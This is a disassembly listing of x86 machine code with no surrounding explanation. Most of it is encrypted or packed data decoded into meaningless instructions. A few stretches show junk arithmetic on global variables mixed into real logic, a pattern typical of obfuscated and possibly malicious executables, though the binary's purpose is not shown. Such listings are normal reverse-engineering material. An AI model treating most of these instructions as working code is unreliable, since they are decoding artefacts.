  407229:	xchg   ebp,eax
  40722a:	lods   eax,DWORD PTR ds:[esi]
  40722b:	bound  edi,QWORD PTR [ebx+0x48]
  40722e:	add    esi,DWORD PTR [esi+0x77ea05a6]
  407234:	aas    
  407235:	test   eax,0xfe6b29ba
  40723a:	nop
  40723b:	int    0x89
  40723d:	push   edx
  40723e:	(bad)  
  40723f:	xlat   BYTE PTR ds:[ebx]
  407240:	int3   
  407241:	lods   al,BYTE PTR ds:[esi]
  407242:	test   ah,0xa6
  407245:	stc    
  407246:	xor    BYTE PTR [edi-0x66],cl
  407249:	fsub   DWORD PTR [edx-0x20f63dbd]
  40724f:	mov    ecx,0xfff6173e
  407254:	add    BYTE PTR [edi+0x13],0x1
  407258:	cmp    DWORD PTR [eax+0x66a227cf],edi
  40725e:	ins    DWORD PTR es:[edi],dx
  40725f:	aaa    
  407260:	pop    ds
  407261:	dec    edi
  407262:	cli    
  407263:	mov    WORD PTR [ebx-0x80],?
  407266:	mov    bh,0x14
  407268:	lock scas al,BYTE PTR es:[edi]
  40726a:	cmp    BYTE PTR [esi+0x5],0xbd
  40726e:	aaa    
  40726f:	ret    
  407270:	dec    esp
  407271:	je     0x4072db
  407273:	fidiv  WORD PTR [eax]
  407275:	aas    
  407276:	nop
  407277:	xor    al,0x23
  407279:	sub    al,0xbe
  40727b:	ds inc ebx
  40727d:	fnstcw WORD PTR [ebx+0x3673665c]
  407283:	adc    eax,0xbce7ee97
  407288:	jmp    0xbb59:0x85a69fa2
  40728f:	mov    edx,esi
  407291:	jbe    0x407225
  407293:	add    DWORD PTR [ecx+0x4d],0x16690699
  40729a:	add    al,0xd6
  40729c:	ds sbb ecx,ecx
  40729f:	ja     0x40728d
  4072a1:	adc    esi,DWORD PTR [ebp+0x4de2b82e]
  4072a7:	pop    esp
  4072a8:	sub    al,0x51
  4072aa:	fwait
  4072ab:	imul   ebp,DWORD PTR [edx],0x66be01f0
  4072b1:	jp     0x4072c2
  4072b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b4:	test   al,0xd7
  4072b6:	in     al,0x55
  4072b8:	out    dx,eax
  4072b9:	and    DWORD PTR gs:[esi+0x4bafc460],esp
  4072c0:	cmp    BYTE PTR [ebx+0x4c],ch
  4072c3:	fsub   QWORD PTR [edx+0x53c6ea3e]
  4072c9:	pop    edx
  4072ca:	push   eax
  4072cb:	(bad)  
  4072cc:	ins    DWORD PTR es:[edi],dx
  4072cd:	sbb    BYTE PTR [edi+0x5cba96],0x30
  4072d4:	mov    cs,edx
  4072d6:	jno    0x4072b2
  4072d8:	jle    0x40725f
  4072da:	lds    edx,FWORD PTR fs:[ebx-0x5bf1226]
  4072e1:	test   DWORD PTR [edi],edi
  4072e3:	add    al,0x54
  4072e5:	lea    edx,[ecx+eiz*2-0x6bf4c47b]
  4072ec:	push   ds
  4072ed:	xor    esp,DWORD PTR [esi+0x5f]
  4072f0:	shl    BYTE PTR [eax],1
  4072f2:	pushf  
  4072f3:	mov    ebx,0xd47dd055
  4072f8:	xchg   edi,eax
  4072f9:	aad    0xd1
  4072fb:	das    
  4072fc:	fadd   DWORD PTR [edx]
  4072fe:	addr16 repnz mov al,ds:0xe3a9
  407303:	xchg   ebx,eax
  407304:	retf   
  407305:	cwde   
  407306:	and    al,0x5f
  407308:	jecxz  0x40735e
  40730a:	jmp    0x80d19a7e
  40730f:	pusha  
  407310:	gs loope 0x4072ef
  407313:	cmc    
  407314:	mov    edi,DWORD PTR [edi]
  407316:	clc    
  407317:	push   esp
  407318:	int    0xd5
  40731a:	int    0x10
  40731c:	cmp    eax,0xa918a164
  407321:	pop    ax
  407323:	and    eax,0x9ff573ec
  407328:	pop    ecx
  407329:	int    0x2a
  40732b:	aad    0xf6
  40732d:	lds    edi,FWORD PTR [ebp-0x7cb22574]
  407333:	mov    esi,0x15c2b60e
  407338:	js     0x40737e
  40733a:	nop
  40733b:	push   ss
  40733c:	add    ebp,DWORD PTR [ebp+ecx*2+0x67]
  407340:	jae    0x40739c
  407342:	(bad)  
  407343:	into   
  407344:	push   esi
  407345:	sub    bh,0x8b
  407348:	inc    ebp
  407349:	hlt    
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	nop
  4073fc:	push   edi
  4073fd:	dec    edx
  4073fe:	pop    ds
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	scas   eax,DWORD PTR es:[edi]
  407408:	(bad)  
  407409:	xchg   esp,eax
  40740a:	retf   0xf508
  40740d:	add    al,0x87
  40740f:	(bad)  
  407410:	sub    ecx,esp
  407412:	jmp    FWORD PTR [edi-0x76717ddb]
  407418:	sub    ch,BYTE PTR [ebp+0x3]
  40741b:	mov    ds:0xa6d5ea41,al
  407420:	leave  
  407421:	dec    esi
  407422:	dec    esi
  407423:	sbb    DWORD PTR [ebx+0x53],edx
  407426:	icebp  
  407427:	jnp    0x40741e
  407429:	pop    ecx
  40742a:	dec    ecx
  40742b:	add    al,0x1a
  40742d:	fiadd  WORD PTR [eax+ebx*2-0x11]
  407431:	les    edx,FWORD PTR [ebp-0x47]
  407434:	pop    ebx
  407435:	push   ss
  407436:	lods   al,BYTE PTR ds:[esi]
  407437:	or     edx,DWORD PTR [ebp+0x49b1d4b8]
  40743d:	sub    al,0x35
  40743f:	xor    eax,0x355fa7a
  407444:	push   ecx
  407445:	(bad)  
  407447:	lahf   
  407448:	and    ecx,DWORD PTR [esi]
  40744a:	popa   
  40744b:	push   0x6105f759
  407450:	shr    DWORD PTR [eax],1
  407452:	xchg   esi,eax
  407453:	ins    BYTE PTR es:[edi],dx
  407454:	imul   cl
  407456:	bound  ebx,QWORD PTR [edx+0x2a]
  407459:	js     0x40747e
  40745b:	ins    DWORD PTR es:[edi],dx
  40745c:	cmp    BYTE PTR [esi+edx*2],al
  40745f:	mov    ah,cl
  407461:	ins    BYTE PTR es:[edi],dx
  407462:	mov    esp,0x5d51882e
  407467:	dec    esi
  407468:	hlt    
  407469:	retfw  0x4a3c
  40746d:	ror    DWORD PTR [edx+0x12d3b32e],0x98
  407474:	xchg   esi,eax
  407475:	adc    DWORD PTR [edi-0x78d3f5d1],edx
  40747b:	outs   dx,BYTE PTR ds:[esi]
  40747c:	jle    0x40745a
  40747e:	mov    ds:0x133794b4,eax
  407483:	cmp    bl,BYTE PTR [edi+0x85a5380]
  407489:	clc    
  40748a:	adc    esp,edi
  40748c:	aad    0xa8
  40748e:	shl    esp,1
  407490:	xchg   BYTE PTR [edi+0x3c],bl
  407493:	add    al,0xf5
  407495:	sbb    DWORD PTR [ecx+0x45],0x37dcb24b
  40749c:	fidivr DWORD PTR [edi+0x16]
  40749f:	mov    dl,0xa3
  4074a1:	push   es
  4074a2:	pop    ds
  4074a3:	jp     0x407478
  4074a5:	test   DWORD PTR [edx],0x323441ab
  4074ab:	loop   0x40746e
  4074ad:	dec    ebx
  4074ae:	or     esi,edi
  4074b0:	mov    ecx,0x79a7ef01
  4074b5:	sub    eax,DWORD PTR ds:0xff84d1c0
  4074bb:	lds    ebp,FWORD PTR [edi-0x467dff3f]
  4074c1:	mov    DWORD PTR [ebx-0x25],0xa6511864
  4074c8:	sbb    al,0x78
  4074ca:	mov    ds:0xf47bc6b6,eax
  4074cf:	jns    0x407536
  4074d1:	xchg   esp,eax
  4074d2:	or     BYTE PTR [esi-0x1b],0x9a
  4074d6:	mov    ?,WORD PTR [edx]
  4074d8:	mov    ah,0x36
  4074da:	icebp  
  4074db:	push   0x4ad8f13c
  4074e0:	xor    esp,DWORD PTR [ecx]
  4074e2:	xchg   edx,eax
  4074e3:	jge    0x40747d
  4074e5:	fxch   st(6)
  4074e7:	pop    es
  4074e8:	repz add ah,BYTE PTR [edi-0x3f9e6fff]
  4074ef:	sbb    al,0x69
  4074f1:	(bad)  
  4074f2:	out    0xd9,eax
  4074f4:	arpl   WORD PTR [ecx-0x74],dx
  4074f7:	fcom   QWORD PTR [edi]
  4074f9:	mov    esi,0xd3a59c7b
  4074fe:	cmp    eax,0x3cc3c0c6
  407503:	pop    edi
  407504:	outs   dx,DWORD PTR ds:[esi]
  407505:	call   0x9e0b0370
  40750a:	repz aaa 
  40750c:	jmp    0x7ed56a36
  407511:	call   0xca96:0x3ad95ca9
  407518:	cmp    bl,BYTE PTR [ebx]
  40751a:	retf   
  40751b:	jmp    0x517a:0x1d6be8c4
  407522:	dec    edi
  407523:	lods   eax,DWORD PTR ds:[esi]
  407524:	ins    BYTE PTR es:[edi],dx
  407525:	int3   
  407526:	sub    esp,ebx
  407528:	xchg   ah,dh
  40752a:	pop    edx
  40752b:	icebp  
  40752c:	sar    bl,cl
  40752e:	jne    0x4074de
  407530:	jmp    0x4074e7
  407532:	clc    
  407533:	mov    al,ds:0xa40c58b0
  407538:	mov    eax,ds:0x4cf7fbfa
  40753d:	pop    ss
  40753e:	mov    eax,0x4fdd1f2b
  407543:	or     edi,DWORD PTR [ebp+0x70]
  407546:	stos   DWORD PTR es:[edi],eax
  407547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407548:	repnz fcom DWORD PTR [edx]
  40754b:	mov    eax,ds:0x3d2ce8a6
  407550:	(bad)  
  407551:	mov    ebp,0x57c53330
  407556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407557:	xor    eax,0x4d4a3c0d
  40755c:	and    eax,0x4647e171
  407561:	inc    ebp
  407562:	fisttp DWORD PTR [edi]
  407564:	inc    esp
  407565:	and    BYTE PTR [edx-0x7fac5cd9],dl
  40756b:	mov    cl,0x4f
  40756d:	adc    DWORD PTR [eax],eax
  40756f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407570:	cmc    
  407571:	ins    DWORD PTR es:[edi],dx
  407572:	adc    bl,BYTE PTR [eax+0x338bd01b]
  407578:	jl     0x4075eb
  40757a:	mov    eax,ds:0xc3326a0e
  40757f:	dec    eax
  407580:	push   ds
  407581:	aad    0x79
  407583:	cli    
  407584:	les    edi,FWORD PTR [edi+0x249ee6]
  40758a:	arpl   WORD PTR [edi+0x7a],ax
  40758d:	les    edx,FWORD PTR [ecx+edi*4]
  407590:	or     al,0x59
  407592:	add    DWORD PTR [edx+ebp*8+0x17],edi
  407596:	sub    eax,0xfb07ab45
  40759b:	xchg   DWORD PTR ds:0x59846a30,ecx
  4075a1:	jb     0x4075e4
  4075a3:	ss mov edi,0xfa5c0eb1
  4075a9:	jmp    0x4075b3
  4075ab:	mov    edi,DWORD PTR [esi+0x2b]
  4075ae:	lea    edi,[ecx]
  4075b0:	push   ds
  4075b1:	mov    esp,0x7ec45698
  4075b6:	arpl   bp,si
  4075b8:	inc    edx
  4075b9:	mov    BYTE PTR [esi*2-0x1ee23091],bl
  4075c0:	push   es
  4075c1:	out    dx,al
  4075c2:	sbb    edi,esi
  4075c4:	sbb    BYTE PTR [ecx-0x7713a7eb],0xda
  4075cb:	outs   dx,BYTE PTR ds:[esi]
  4075cc:	fsubr  st,st(7)
  4075ce:	test   eax,0x35d0766a
  4075d3:	and    dl,dh
  4075d5:	jg     0x4075d3
  4075d7:	add    BYTE PTR [esi],cl
  4075d9:	jp     0x40759b
  4075db:	adc    dl,BYTE PTR [ebx-0x6119d710]
  4075e1:	add    esp,ebp
  4075e3:	pushf  
  4075e4:	cmp    eax,0xf24fd57f
  4075e9:	test   al,0xb1
  4075eb:	fcomp  st(4)
  4075ed:	dec    edi
  4075ee:	pop    ds
  4075ef:	daa    
  4075f0:	sbb    edx,DWORD PTR [ecx]
  4075f2:	inc    ebx
  4075f3:	out    dx,al
  4075f4:	mov    ah,0x46
  4075f6:	adc    edx,DWORD PTR [ebx-0xb]
  4075f9:	xchg   ecx,eax
  4075fa:	pop    ds
  4075fb:	or     bl,BYTE PTR [edi-0x4b]
  4075fe:	lock push cs
  407600:	popa   
  407601:	gs fist DWORD PTR cs:[esi+0x748d384a]
  407609:	jmp    0x407597
  40760b:	adc    DWORD PTR [eax],ecx
  40760d:	retf   0x7fb7
  407610:	push   esi
  407611:	and    eax,0xd7d73608
  407616:	nop
  407617:	sar    BYTE PTR [edx+ebx*8],0x19
  40761b:	xchg   edx,eax
  40761c:	dec    esp
  40761d:	out    dx,al
  40761e:	cmp    al,0x9d
  407620:	aam    0x18
  407622:	inc    esi
  407623:	arpl   WORD PTR [edx-0x6b],di
  407626:	stc    
  407627:	call   0xe16a:0xe8d0936d
  40762e:	js     0x407633
  407630:	test   esi,esi
  407632:	loop   0x40769a
  407634:	rcr    BYTE PTR [edx+eax*1],0xa7
  407638:	call   0xc305:0x9acbb416
  40763f:	sub    DWORD PTR [edi+0x751375a6],esp
  407645:	mov    dh,0x4d
  407647:	(bad)  
  407649:	xor    al,0xdd
  40764b:	(bad)  
  40764c:	lahf   
  40764d:	es aaa 
  40764f:	pop    edi
  407650:	scas   al,BYTE PTR es:[edi]
  407651:	call   0xf7697662
  407656:	stc    
  407657:	test   eax,0x9f4dcf58
  40765c:	mov    esi,0x7b6a8111
  407661:	out    dx,eax
  407662:	or     eax,0x6feebad0
  407667:	cs pop eax
  407669:	out    0x8c,eax
  40766b:	xor    BYTE PTR [eax],cl
  40766d:	jae    0x40766b
  40766f:	enter  0x580d,0xc9
  407673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407674:	mov    dl,0xd9
  407676:	mov    ds:0xe99c5f7a,eax
  40767b:	shl    DWORD PTR [eax+0x4e],0xdb
  40767f:	push   0x4
  407681:	outs   dx,BYTE PTR ds:[esi]
  407682:	cmp    al,BYTE PTR [ebp-0x478df6c3]
  407688:	stos   BYTE PTR es:[edi],al
  407689:	pop    edi
  40768a:	cmc    
  40768b:	cs js  0x40770d
  40768e:	mov    esp,edx
  407690:	dec    ebx
  407691:	pop    ds
  407692:	cmp    bl,al
  407694:	adc    eax,0x6080fef0
  407699:	repz inc esi
  40769b:	mov    ch,0xb5
  40769d:	loope  0x4076fe
  40769f:	and    ch,BYTE PTR [edi+eax*8+0x38]
  4076a3:	adc    eax,eax
  4076a5:	fmul   DWORD PTR [eax+0x51984c52]
  4076ab:	cdq    
  4076ac:	ror    BYTE PTR [edx+0x2826f2ad],1
  4076b2:	test   BYTE PTR [ebp-0x34df68ee],al
  4076b8:	and    BYTE PTR [ebx-0x4359515d],ah
  4076be:	pop    esi
  4076bf:	mov    ds:0x23860139,al
  4076c4:	cdq    
  4076c5:	xor    esp,DWORD PTR [ebp-0x36]
  4076c8:	sub    DWORD PTR [ebp+0x1d41d01],edi
  4076ce:	pushf  
  4076cf:	and    al,0x77
  4076d1:	call   0x602e56ba
  4076d6:	(bad)  
  4076d7:	jnp    0x40772b
  4076d9:	call   FWORD PTR [esi-0x619bb4ea]
  4076df:	rcr    DWORD PTR [ebp+0x22],cl
  4076e2:	cmp    bl,BYTE PTR [ebp-0x2740864c]
  4076e8:	or     dh,bl
  4076ea:	test   al,0xfd
  4076ec:	and    DWORD PTR [ecx],0x41
  4076ef:	cdq    
  4076f0:	out    0x6c,eax
  4076f2:	ror    BYTE PTR [ecx-0x3c],cl
  4076f5:	retf   0xbe65
  4076f8:	adc    al,0xc9
  4076fa:	(bad)  
  4076fb:	fcom   DWORD PTR [edi+ebp*4]
  4076fe:	xchg   ebx,eax
  4076ff:	lods   eax,DWORD PTR ds:[esi]
  407700:	push   edi
  407701:	mul    BYTE PTR [edx-0x1b]
  407704:	das    
  407705:	sbb    DWORD PTR [edi+ebp*2],esi
  407708:	fadd   DWORD PTR [ecx+0x5696045f]
  40770e:	pop    esp
  40770f:	pop    esi
  407710:	scas   al,BYTE PTR es:[edi]
  407711:	xlat   BYTE PTR ds:[ebx]
  407712:	dec    edi
  407713:	cmp    al,0xf
  407715:	pop    edx
  407716:	test   DWORD PTR [eax-0x20],ebp
  407719:	mov    bl,0xea
  40771b:	lahf   
  40771c:	and    ebx,DWORD PTR [edi]
  40771e:	aad    0x9b
  407720:	nop
  407721:	mov    ah,0x6
  407723:	pop    esp
  407724:	(bad)  
  407725:	jl     0x40774e
  407727:	ds ja  0x4076d8
  40772a:	rcr    BYTE PTR [eax-0x5f5dcbd1],0x43
  407731:	jno    0x40778e
  407733:	dec    ebx
  407734:	cmp    DWORD PTR [eax],edx
  407736:	aaa    
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	inc    edx
  4077da:	cs pop ebp
  4077dc:	xor    eax,0x7070cca7
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077fd
  4077e6:	cmp    al,0xc9
  4077e8:	pop    ds
  4077e9:	test   BYTE PTR [edx],bl
  4077eb:	dec    ecx
  4077ec:	nop
  4077ed:	cmc    
  4077ee:	adc    eax,DWORD PTR [eax+eiz*4-0x67]
  4077f2:	pop    esi
  4077f3:	sahf   
  4077f4:	cmc    
  4077f5:	cmp    al,0xab
  4077f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077f8:	sub    BYTE PTR ds:0xc84a9e4c,bl
  4077fe:	shr    BYTE PTR [esi-0x7f],cl
  407801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407802:	inc    eax
  407803:	dec    eax
  407804:	or     BYTE PTR [ebx-0x31],ch
  407807:	ds stos BYTE PTR es:[edi],al
  407809:	sbb    DWORD PTR [ecx-0x6482a593],ecx
  40780f:	sub    bh,BYTE PTR [esi+0x3664b304]
  407815:	fbld   TBYTE PTR [edx-0x6a]
  407818:	retw   0x46a2
  40781c:	push   ebx
  40781d:	mov    DWORD PTR [ebx+edx*4-0x4f],ebx
  407821:	push   es
  407822:	adc    eax,0xd0c860db
  407827:	pop    esp
  407828:	mov    ecx,0x68635f1e
  40782d:	pusha  
  40782e:	mov    DWORD PTR [eax],edx
  407830:	cmp    edx,DWORD PTR [ebx+esi*1]
  407833:	scas   al,BYTE PTR es:[edi]
  407834:	xchg   ebp,eax
  407835:	sub    ebp,DWORD PTR [esi+0x73da5b7f]
  40783b:	pop    ss
  40783c:	jno    0x4077eb
  40783e:	inc    ebx
  40783f:	sub    dl,bl
  407841:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407843:	(bad)  
  407844:	in     eax,dx
  407845:	fs into 
  407847:	xchg   BYTE PTR [esi+0x4e],bh
  40784a:	mov    bl,dh
  40784c:	mov    eax,ds:0x8366fcfe
  407851:	rcl    esp,0x8e
  407854:	add    dh,0xe
  407857:	lea    ebp,[esi+0x4cef67e1]
  40785d:	pop    edi
  40785e:	call   0x2740:0x90738a03
  407865:	adc    BYTE PTR ds:0x8aefda95,0x5a
  40786c:	sahf   
  40786d:	add    al,0x82
  40786f:	je     0x4078d2
  407871:	push   esi
  407872:	pop    esp
  407873:	out    dx,al
  407874:	mov    edx,0xeec5a5d7
  407879:	ficomp DWORD PTR [eax]
  40787b:	sbb    cl,BYTE PTR [edx+0x39]
  40787e:	stc    
  40787f:	das    
  407880:	lods   al,BYTE PTR ds:[esi]
  407881:	and    al,0x6b
  407883:	popf   
  407884:	xor    esp,edi
  407886:	mov    ch,BYTE PTR [edx]
  407888:	dec    esp
  407889:	cmp    bl,BYTE PTR [edi-0x56]
  40788c:	push   ds
  40788d:	je     0x4078da
  40788f:	(bad)  
  407890:	jae    0x407832
  407892:	and    BYTE PTR [eax+0x73d41002],bh
  407898:	in     al,0x12
  40789a:	stos   DWORD PTR es:[edi],eax
  40789b:	mov    esi,0x44b6dd2
  4078a0:	iret   
  4078a1:	data16 int 0xcb
  4078a4:	ja     0x4078c6
  4078a6:	scas   eax,DWORD PTR es:[edi]
  4078a7:	hlt    
  4078a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a9:	cmp    edx,ebx
  4078ab:	data16 rcl BYTE PTR [ebx],0xe
  4078af:	and    ch,BYTE PTR [edi+eiz*1+0x52]
  4078b3:	jmp    0x80deef5
  4078b8:	mov    esp,0xaf2cee78
  4078bd:	cmp    al,0xb4
  4078bf:	xor    cl,BYTE PTR [eax-0x3067bde9]
  4078c5:	jmp    0xb779:0x2bec9971
  4078cc:	stos   BYTE PTR es:[edi],al
  4078cd:	in     eax,0x95
  4078cf:	mov    ah,0xe7
  4078d1:	out    dx,al
  4078d2:	je     0x407924
  4078d4:	dec    eax
  4078d5:	dec    edx
  4078d6:	adc    edi,esp
  4078d8:	aad    0x44
  4078da:	xor    DWORD PTR [eax],0xdb996325
  4078e0:	adc    al,0x42
  4078e2:	stc    
  4078e3:	mov    fs,esi
  4078e5:	jnp    0x4078d7
  4078e7:	mov    esi,0x786ed06e
  4078ec:	fs cmp esi,DWORD PTR es:[edi-0x2ceee75f]
  4078f4:	(bad)  
  4078f5:	adc    cl,BYTE PTR [esi+0x77]
  4078f8:	jmp    0x4078e1
  4078fa:	stos   BYTE PTR es:[edi],al
  4078fb:	pushf  
  4078fc:	jmp    0x407889
  4078fe:	movq   mm0,QWORD PTR [edx]
  407901:	inc    esi
  407902:	xor    DWORD PTR [ecx],ebx
  407904:	out    dx,al
  407905:	jno    0x40790a
  407907:	cmp    esp,edx
  407909:	mov    ebx,0x25f9ba40
  40790e:	mov    ah,0xd
  407910:	repz (bad) 
  407912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407913:	jno    0x4078ce
  407915:	gs loop 0x4078e4
  407918:	in     eax,0x79
  40791a:	or     DWORD PTR [ecx],esi
  40791c:	mov    al,ds:0xfbf1c814
  407921:	stos   DWORD PTR es:[edi],eax
  407922:	js     0x40795e
  407924:	(bad)  
  407925:	jmp    0x95e5:0xcd8166a5
  40792c:	or     edx,edi
  40792e:	and    ah,BYTE PTR [eax+0x5a65d926]
  407934:	cmp    ebx,DWORD PTR [ebx+0x68d2348c]
  40793a:	in     al,dx
  40793b:	inc    eax
  40793c:	retf   0x6cd0
  40793f:	psllq  mm2,mm6
  407942:	in     al,dx
  407943:	jge    0x4078eb
  407945:	iret   
  407946:	dec    ebp
  407947:	jb     0x40794d
  407949:	mov    cl,0x3f
  40794b:	iret   
  40794c:	pop    esi
  40794d:	das    
  40794e:	inc    esp
  40794f:	test   al,0xc
  407951:	je     0x40794f
  407953:	and    dh,ah
  407955:	and    al,0x40
  407957:	ss call 0xef19:0x52207724
  40795f:	xor    BYTE PTR ds:0x12e24805,ch
  407965:	mov    ds:0xc960d898,eax
  40796a:	cmp    BYTE PTR [ecx-0x416ec71e],bl
  407970:	call   0xde03:0xd1a3192e
  407977:	sub    BYTE PTR [esi-0x6b],ch
  40797a:	ds out 0x4c,al
  40797d:	js     0x407994
  40797f:	je     0x4079dd
  407981:	outs   dx,BYTE PTR ds:[esi]
  407982:	mov    bh,0xe5
  407984:	in     eax,0xa7
  407986:	fcmovu st,st(0)
  407988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407989:	add    BYTE PTR [esi-0x3],0xc1
  40798d:	daa    
  40798e:	arpl   WORD PTR [ebp+0x28378990],bp
  407994:	mov    al,0x71
  407996:	and    edx,esi
  407998:	sbb    cl,dh
  40799a:	xor    eax,0x507bc009
  40799f:	bound  eax,QWORD PTR [edx]
  4079a1:	sbb    eax,0xb81be393
  4079a6:	xor    DWORD PTR [eax-0x82c266],ecx
  4079ac:	in     al,dx
  4079ad:	test   BYTE PTR [esi-0x18],bh
  4079b0:	xchg   ecx,eax
  4079b1:	adc    BYTE PTR [ecx+0x7b2e3b8f],0x9d
  4079b8:	and    DWORD PTR [ebx+esi*4],0x2
  4079bc:	in     al,0x63
  4079be:	retf   
  4079bf:	mov    al,ds:0x6d1d67e2
  4079c4:	popa   
  4079c5:	mov    ch,0xf0
  4079c7:	jecxz  0x4079c8
  4079c9:	dec    edi
  4079ca:	adc    DWORD PTR [ebx+0x7],ecx
  4079cd:	mov    DWORD PTR ds:0xd1fffe66,0xeee746e6
  4079d7:	stos   BYTE PTR es:[edi],al
  4079d8:	into   
  4079d9:	cmp    DWORD PTR [edi-0x57bac0c8],ebp
  4079df:	xor    BYTE PTR [edi-0x3c],bh
  4079e2:	pop    edi
  4079e3:	lods   al,BYTE PTR ds:[esi]
  4079e4:	mov    dh,0x38
  4079e6:	fldenv [edx+0x6e]
  4079e9:	cmc    
  4079ea:	enter  0x8c64,0xaf
  4079ee:	mov    dh,0x2e
  4079f0:	sbb    dl,BYTE PTR [ebx]
  4079f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f3:	pop    esi
  4079f4:	xor    DWORD PTR [edx],esp
  4079f6:	or     BYTE PTR [edi],dl
  4079f8:	enter  0xe224,0xc8
  4079fc:	ficom  DWORD PTR [edi*4+0x52dacdc2]
  407a03:	cmp    BYTE PTR [esi+0x132e1a7d],0x3e
  407a0a:	jmp    0xe6d:0x6a7590ad
  407a11:	rcl    DWORD PTR [edi],cl
  407a13:	jae    0x4079e7
  407a15:	scas   al,BYTE PTR es:[edi]
  407a16:	fsubr  QWORD PTR [bp+si]
  407a19:	adc    eax,0xb699f645
  407a1e:	mov    dl,BYTE PTR [edx]
  407a20:	fld    TBYTE PTR [ebp+ebx*1+0x96c5f99]
  407a27:	pop    ss
  407a28:	inc    ebp
  407a29:	jmp    0x407a2c
  407a2b:	inc    ebp
  407a2c:	ficomp DWORD PTR [edx-0x7]
  407a30:	cld    
  407a31:	(bad)
  407a35:	mov    dl,0x7d
  407a37:	ins    DWORD PTR es:[edi],dx
  407a38:	lahf   
  407a39:	stos   DWORD PTR es:[edi],eax
  407a3a:	ret    0xc829
  407a3d:	add    al,BYTE PTR [edi-0x6b59d422]
  407a43:	mov    ah,0x8c
  407a45:	xchg   esp,eax
  407a46:	leave  
  407a47:	mov    esp,0xd127d4f9
  407a4c:	out    dx,al
  407a4d:	cmp    BYTE PTR [ecx+0x78096085],ch
  407a53:	push   0xffffffdf
  407a55:	mov    bl,0xb2
  407a57:	fstp   TBYTE PTR [edi-0x50]
  407a5a:	aam    0x3e
  407a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5d:	push   edi
  407a5e:	dec    esi
  407a5f:	(bad)  
  407a60:	jbe    0x407a10
  407a62:	jp     0x407a65
  407a64:	loope  0x407ab3
  407a66:	sahf   
  407a67:	in     al,0x70
  407a69:	rcr    DWORD PTR [esi+0x6b],1
  407a6c:	scas   eax,DWORD PTR es:[edi]
  407a6d:	inc    eax
  407a6e:	or     DWORD PTR [esi+0x17fd777c],0x68
  407a75:	sub    edx,DWORD PTR [eax+0x1d]
  407a78:	sbb    ah,BYTE PTR ds:0x9585bd7f
